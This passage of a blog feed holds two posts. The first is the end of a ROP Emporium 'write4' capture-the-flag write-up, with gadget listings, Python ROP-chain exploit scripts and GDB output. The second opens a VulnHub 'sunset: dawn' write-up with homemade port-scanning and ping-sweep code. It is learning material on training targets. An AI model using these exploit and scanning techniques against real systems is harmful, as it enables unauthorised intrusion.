+</span></span></code></pre></div><p>It looks empty. This section is likely safe to overwrite. The address of that section is <code>0x0804a018</code>. Now I need a way to write that value to the edi register. I also need the ability to write arbitrary bytes to the ebp register. I use <a href="https://github.com/sashs/Ropper">ropper</a> to look for more useful gadgets. I believe pop will be the most useful command. It should allow me to place values from the stack(which I control) into the needed registers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;ropper -f write432
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x08048525: pop ebp; lea esp, <span style="color:#f92672">[</span>ecx - 4<span style="color:#f92672">]</span>; ret;    
+</span></span><span style="display:flex;"><span>0x080485ab: pop ebp; ret;    
+</span></span><span style="display:flex;"><span>0x080485a8: pop ebx; pop esi; pop edi; pop ebp; ret;  
+</span></span><span style="display:flex;"><span>0x0804839d: pop ebx; ret;    
+</span></span><span style="display:flex;"><span>0x08048524: pop ecx; pop ebp; lea esp, <span style="color:#f92672">[</span>ecx - 4<span style="color:#f92672">]</span>; ret; 
+</span></span><span style="display:flex;"><span>0x080485aa: pop edi; pop ebp; ret;    
+</span></span><span style="display:flex;"><span>0x080485a9: pop esi; pop edi; pop ebp; ret;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The most useful gadget appears to be this one: <code>0x080485aa: pop edi; pop ebp; ret;</code>. I will now perform a short test run to see if I can get values into the registers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BBBB&#39;</span> <span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;DDDD&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>I use GDB to examine the registers after overflowing the buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers    
+</span></span><span style="display:flex;"><span>eax            0xb                 <span style="color:#ae81ff">11</span>  
+</span></span><span style="display:flex;"><span>ecx            0xf7f770f4          -134778636  
+</span></span><span style="display:flex;"><span>edx            0x1                 <span style="color:#ae81ff">1</span>  
+</span></span><span style="display:flex;"><span>ebx            0x41414141          <span style="color:#ae81ff">1094795585</span>  
+</span></span><span style="display:flex;"><span>esp            0xffffd49c          0xffffd49c  
+</span></span><span style="display:flex;"><span>ebp            0x44444444          0x44444444  
+</span></span><span style="display:flex;"><span>esi            0xffffd564          -10908  
+</span></span><span style="display:flex;"><span>edi            0x42424242          <span style="color:#ae81ff">1111638594</span>
+</span></span></code></pre></div><p>The B&rsquo;s wound up in the edi register while the D&rsquo;s ended up in the ebp register. Now I put the actual values I want in the two registers and attempt to use the ROP gadget to move the contents of ebp to the memory address in edi.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#buf=b&#39;\x43&#39;*4 </span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span>) <span style="color:#75715e"># .data address </span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>I check the memory location.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/3x 0x804a018  
+</span></span><span style="display:flex;"><span>0x804a018:      0x67616c66      0x00000000      0x00000000
+</span></span></code></pre></div><p>It appears the value has been written to memory. I have to write the second half of the argument to memory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#writing first half of argument to memory</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span>) <span style="color:#75715e"># .data address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#writing second half of argument to memory</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>) <span style="color:#75715e"># .data address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.txt&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>It appears to work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/3x 0x804a018    
+</span></span><span style="display:flex;"><span>0x804a018:      0x67616c66      0x7478742e      0x00000000
+</span></span></code></pre></div><p>It is now time to make the call to the <code>print_file@plt</code> function with the memory location where I wrote flag.txt as an argument.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#writing first half of argument to memory</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span>) <span style="color:#75715e"># .data address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#writing second half of argument to memory</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>) <span style="color:#75715e"># .data address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.txt&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># function call</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x80483d0</span>) <span style="color:#75715e"># &lt;print_file@plt&gt;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;CCCC&#39;</span> <span style="color:#75715e"># fake return address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span>) <span style="color:#75715e"># .data address / args 1</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>I run the program and get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run &lt; writebin    
+</span></span><span style="display:flex;"><span>The program being debugged has been started already.  
+</span></span><span style="display:flex;"><span>Start it from the beginning? <span style="color:#f92672">(</span>y or n<span style="color:#f92672">)</span> y  
+</span></span><span style="display:flex;"><span>Starting program: /home/spook2/school/notSchool/blog fodder/rop/write4/write432 &lt; writebin  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>  
+</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/usr/lib/libthread_db.so.1&#34;</span>.  
+</span></span><span style="display:flex;"><span>write4 by ROP Emporium  
+</span></span><span style="display:flex;"><span>x86  
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>Go ahead and give me the input already!  
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>&gt; Thank you!  
+</span></span><span style="display:flex;"><span>ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>This concludes the first batch of ROP exploit challenge write-ups for this blog. Completing these challenges was a fun way to brush up on my knowledge of assembly. I highly recommend <a href="https://ropemporium.com/">ROP Emporium</a>.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Dawn writeup but with slightly more programming</title>
+            <link>http://localhost:1313/posts/first/</link>
+            <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/first/</guid>
+            <description>intro / rules Welcome to the first of hopefully a series of blog posts. The goal of
+this post is to explain the rules of the challenge I have created for
+myself. The goal is to solve Boot2Root style VMs while writing as many
+custom tools as possible. There are a few categories of tools that I
+have semi arbitrarily declared safe for use during the challenge. These
+tools include the following:</description>
+            <content type="html"><![CDATA[<h1 id="intro--rules">intro / rules</h1>
+<p>Welcome to the first of hopefully a series of blog posts. The goal of<br>
+this post is to explain the rules of the challenge I have created for<br>
+myself. The goal is to solve Boot2Root style VMs while writing as many<br>
+custom tools as possible. There are a few categories of tools that I<br>
+have semi arbitrarily declared safe for use during the challenge. These<br>
+tools include the following:</p>
+<ul>
+<li>web browsers</li>
+<li>burp suite</li>
+<li>netcat</li>
+<li>clients for protocols that are mildly inconvenient to program<br>
+myself(samba,sftp, etc)</li>
+<li>hash identifier tools</li>
+</ul>
+<p>Ultimately the rules for what is and is not allowed are not all that
+important. I think the spirit of the challenge is more important
+overall, and I will likely, in the future, arbitrarily change the rules
+as I decide what seems the most interesting.</p>
+<p>TLDR: If it is installed by default on Kali Linux but not on Ubuntu, I
+will try not to use it.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>In this post, I will attempt to gain root on the box <a href="https://www.vulnhub.com/entry/sunset-dawn,341/">sunset:<br>
+dawn</a> with a twist. I will write custom tools
+to perform most actions needed to gain root on this machine instead of
+relying on premade tools. A tentative set of rules for the challenge I
+have created for myself is listed here.</p>
+<p>After much thinking, I believe I need a port scanner. The real question is how little port scanner do I need. Features like banner grabbing and identifying operating systems seem unnecessary at the moment. I settle on writing a python script that attempts to connect to every TCP port on the machine and report which ports are open. This programming project
+begins, like most, with googling. I concluded that the socket library
+would serve my needs. Then the experimental phase began. This phase
+involves me opening the python interpreter and experimenting with
+random functions to see how they work.</p>
+<p>I use the HTTP server module of python to start a web server on port 80
+of my local machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>I use the Python interpreter to see how the connect_ex function handles open v.s., not open ports.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;&gt;&gt; import socket  
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt;    
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>  
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; port<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>  
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; sock <span style="color:#f92672">=</span> socket.socket<span style="color:#f92672">(</span>socket.AF_INET, socket.SOCK_STREAM<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; server_addr <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>host, port<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:  
+</span></span><span style="display:flex;"><span> File <span style="color:#e6db74">&#34;&lt;stdin&gt;&#34;</span>, line 1, in &lt;module&gt;  
+</span></span><span style="display:flex;"><span>NameError: name <span style="color:#e6db74">&#39;host&#39;</span> is not defined  
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; server_addr <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HOST, port<span style="color:#f92672">)</span>         
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; sock.connect_ex<span style="color:#f92672">(</span>server_addr<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>  
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; server_addr <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HOST, 90<span style="color:#f92672">)</span>       
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; sock.connect_ex<span style="color:#f92672">(</span>server_addr<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">106</span>  
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt;
+</span></span></code></pre></div><p>I safely conclude that the connect_ex function returns 0 if a connection
+can be made. It returns not 0 if a connection cannot be made. It seems
+safe to say most of the work to create a port scanner is done. I only
+need to loop over all the possible ports and hope it is not too slow.</p>
+<p>This code is the current implementation I have:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> <span style="color:#75715e"># plz replace with host IP address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># loops through all ports</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">536</span>):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    port<span style="color:#f92672">=</span>i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    server_addr <span style="color:#f92672">=</span> (HOST, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    port_status<span style="color:#f92672">=</span>sock<span style="color:#f92672">.</span>connect_ex(server_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> port_status<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;port &#34;</span><span style="color:#f92672">+</span> str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; is open&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>: <span style="color:#75715e"># very uneeded</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p>It now occurs to me that I do not have the means to figure out the IP
+address of the machine we're supposed to be hacking. I could check the
+DHCP logs of the router, but that seems like cheating. It would be more interesting to make a tool to scan all the IP addresses in the current subnet and report which machines respond to ping requests.</p>
+<p>I choose to write this tool in C# for no reason in particular. I have
+not programmed in C# in a while, and it seemed like an interesting idea. I settle on this prototype code that pings one machine. I could write a bash script that would use this program to ping all the IP addresses in my subnet, but I would rather add the ability to scan multiple hosts in a range to the tool.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>    <span style="color:#75715e">// C# program to illustrate the</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Command Line Arguments</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">using</span> System.Net.NetworkInformation;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">namespace</span> Ping_scan
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">scanner</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(args.Length ==<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Ping aPing = <span style="color:#66d9ef">new</span> Ping();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    PingReply reply = aPing.Send(args[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(reply.Status==IPStatus.Success){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Console.WriteLine(<span style="color:#e6db74">$&#34;response from: {args[0]}&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Console.WriteLine(<span style="color:#e6db74">&#34;Usage: ping_scan [ip adress]&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    } }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Initially, I had some difficulties deciding what arguments the program should take. I wanted the program to take in an IP address and a netmask in CIDR notation. My desire to keep the program simple for now and C#'s lack of a binary data type(as far as I could tell in the 4 minutes I<br>
+spent googling) forced me to reconsider my original design. I settled
+on taking a start and end IP address as the inputs to the program.</p>
+<p>I wrote a simple IPaddress class for this program. The main use of the IPaddress class is to hide the messy details of both incrementing and comparing IP addresses in the main function of the program.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Net.NetworkInformation;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Net;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Linq;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> Ping_scan
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">scanner</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(args.Length ==<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ping aPing = <span style="color:#66d9ef">new</span> Ping();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PingReply reply = aPing.Send(args[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(reply.Status==IPStatus.Success){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Console.WriteLine(<span style="color:#e6db74">$&#34;response from: {args[0]}&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(args.Length ==<span style="color:#ae81ff">2</span>){
